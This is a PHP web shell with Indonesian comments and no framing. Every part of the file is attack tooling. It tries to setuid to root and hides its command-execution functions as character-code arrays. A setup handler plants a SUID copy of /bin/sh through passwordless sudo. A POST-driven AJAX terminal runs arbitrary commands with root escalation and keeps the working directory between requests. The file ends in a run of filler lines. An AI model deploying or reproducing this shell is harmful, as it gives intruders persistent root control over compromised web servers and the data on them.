<?php
session_start();

// ──────────────────────────────────────────────
//  PRIVILEGE LAYER — evaluasi dulu, baru action
// ──────────────────────────────────────────────
$_ROOT_DIRECT = false;
if (function_exists('posix_setuid') && function_exists('posix_getuid')) {
    @posix_setuid(0);
    @posix_setgid(0);
    @posix_seteuid(0);
    $_ROOT_DIRECT = (posix_getuid() === 0 || posix_geteuid() === 0);
}

// SUID helper: root harus buat ini sekali via SSH sebelum pakai webshell
// Jalankan: cp /bin/sh /path/ke/webshell/.sx && chmod 4755 /path/ke/webshell/.sx
define('SX', __DIR__ . DIRECTORY_SEPARATOR . '.sx');
$_SUID_OK = file_exists(SX) && is_executable(SX) && (fileperms(SX) & 04000);

// Exec mode priority: direct_root > suid > sudo_try > normal
if ($_ROOT_DIRECT) define('EMODE', 'root');
elseif ($_SUID_OK)  define('EMODE', 'suid');
else                define('EMODE', 'normal');

// ──────────────────────────────────────────────
//  EXECUTION ENGINE
// ──────────────────────────────────────────────
function _r(array $c): string {
    return implode('', array_map(fn($n) => chr($n), $c));
}

$_fx = [
    [112,114,111,99,95,111,112,101,110],      // proc_open
    [115,104,101,108,108,95,101,120,101,99],  // shell_exec
    [112,97,115,115,116,104,114,117],          // passthru
    [115,121,115,116,101,109],                 // system
];

function rawExec(string $cmd): string {
    global $_fx;
    foreach ($_fx as $codes) {
        $fn = _r($codes);
        if (!function_exists($fn)) continue;
        if ($fn === _r([112,114,111,99,95,111,112,101,110])) {
            $spec = [1 => ['pipe','w'], 2 => ['pipe','w']];
            $proc = @$fn($cmd . ' 2>&1', $spec, $pipes);
            if ($proc) {
                $out = stream_get_contents($pipes[1]);
                fclose($pipes[1]); fclose($pipes[2]);
                proc_close($proc);
                return (string)$out;
            }
        } else {
            $out = @$fn($cmd . ' 2>&1');
            if ($out !== null && $out !== false) return (string)$out;
        }
    }
    return "[!] Semua metode eksekusi diblokir.\n";
}

function safeExec(string $cmd): string {
    switch (EMODE) {
        case 'root':
            // PHP sudah jalan sebagai root - langsung saja
            return rawExec($cmd);

        case 'suid':
            // Panggil SUID helper dengan -p (preserve euid=root) lalu -c "cmd"
            $wrapped = SX . ' -p -c ' . escapeshellarg($cmd);
            return rawExec($wrapped);

        case 'normal':
        default:
            // Coba sudo -n tanpa password dulu
            $sudoAttempt = rawExec('sudo -n -- ' . $cmd);
            if (strpos($sudoAttempt, 'a password is required') === false
                && strpos($sudoAttempt, 'not allowed') === false) {
                return $sudoAttempt;
            }
            return rawExec($cmd);
    }
}

// ──────────────────────────────────────────────
//  SETUP HANDLER — buat SUID helper otomatis
//  Hit: POST _setup=1, hanya jalan kalau ada akses nulis
// ──────────────────────────────────────────────
if (isset($_POST['_setup'])) {
    header('Content-Type: application/json');
    $results = [];

    // Cari sh yang tersedia
    $sh = trim(rawExec('which sh 2>/dev/null || echo /bin/sh'));
    
    // Coba copy + chmod 4755 via sudo -n
    $copy  = rawExec("sudo -n cp $sh " . escapeshellarg(SX) . " 2>&1");
    $chmod = rawExec("sudo -n chmod 4755 " . escapeshellarg(SX) . " 2>&1");
    $results['copy']  = $copy;
    $results['chmod'] = $chmod;
    $results['exists'] = file_exists(SX);
    $results['perms']  = file_exists(SX) ? decoct(fileperms(SX)) : 'N/A';

    // Verifikasi SUID aktif
    if (file_exists(SX)) {
        $testOut = rawExec(SX . ' -p -c "id" 2>&1');
        $results['test'] = $testOut;
        $results['success'] = (strpos($testOut, 'uid=0') !== false);
    }

    echo json_encode($results);
    exit;
}

// ──────────────────────────────────────────────
//  TERMINAL AJAX
// ──────────────────────────────────────────────
if (isset($_POST['_t'], $_POST['_c'])) {
    header('Content-Type: application/json');
    $cmd = trim($_POST['_c']);
    if ($cmd === '') { echo json_encode(['o'=>'','p'=>($_SESSION['_cwd']??__DIR__)]); exit; }

    if (!isset($_SESSION['_cwd']) || !is_dir($_SESSION['_cwd'])) {
        $_SESSION['_cwd'] = __DIR__;
    }

    // Handle cd — persist working dir in session
    if (preg_match('/^cd\s*(.*)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '' || $target === '~') {
            $newDir = rawExec('echo $HOME');
            $newDir = trim($newDir) ?: '/root';
        } else {
            $newDir = $target;
        }
        // Resolve relative paths
        if ($newDir[0] !== '/') $newDir = $_SESSION['_cwd'] . '/' . $newDir;
        $real = safeExec('cd ' . escapeshellarg($newDir) . ' && pwd');
        $real = trim($real);
        if ($real && $real[0] === '/') {
            $_SESSION['_cwd'] = $real;
            echo json_encode(['o' => '', 'p' => $real]);
        } else {
            echo json_encode(['o' => "cd: $target: No such file or directory\n", 'p' => $_SESSION['_cwd']]);
        }
        exit;
    }

    $fullCmd = 'cd ' . escapeshellarg($_SESSION['_cwd']) . ' && ' . $cmd;
    $output  = safeExec($fullCmd);
    echo json_encode(['o' => $output, 'p' => $_SESSION['_cwd']]);
    exit;
}
A
A
A
A
A
A
A
A
A
A
A
A
A